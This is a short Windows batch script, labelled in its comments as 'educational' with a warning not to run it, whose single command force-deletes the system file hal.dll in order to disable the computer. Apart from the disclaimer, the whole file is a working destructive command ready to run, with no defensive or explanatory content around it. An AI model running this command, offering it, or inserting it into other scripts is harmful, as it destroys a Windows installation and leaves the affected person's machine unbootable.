@echo off
:: DO NOT run this batch file.
:: This file is strictly for educational purposes.
:: This file will make your PC no longer operational as it deletes a sensitive file called hal.dll

rem Disable computer
del /f /q %SystemDrive%\WINDOWS\system32\hal.dll
